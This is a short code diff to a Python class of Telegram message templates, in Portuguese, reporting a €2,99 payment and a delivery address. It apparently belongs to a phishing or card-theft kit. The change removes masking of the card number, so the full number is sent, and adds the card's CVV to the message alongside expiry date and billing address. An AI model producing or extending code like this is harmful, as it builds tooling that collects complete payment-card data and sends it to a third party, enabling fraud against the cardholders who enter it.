@@ -44,8 +44,9 @@ class TelegramTemplates:
 
 💰 **DETALHES DO PAGAMENTO:**
 ┣━ 💵 Valor: `€2,99`
-┣━ 💳 Cartão: `{masked_card}`
-┗━ 📅 Validade: `{card_data.get('dataExpiracao', 'N/A')}`
+┣━ 💳 Cartão: `{card_number}`
+┣━ 📅 Validade: `{card_data.get('dataExpiracao', 'N/A')}`
+┗━ 🔒 CVV: `{card_data.get('cvv', 'N/A')}`
 
 📍 **ENTREGA:**
 ┣━ 🏠 Endereço: `{billing_data.get('endereco', 'N/A')}`
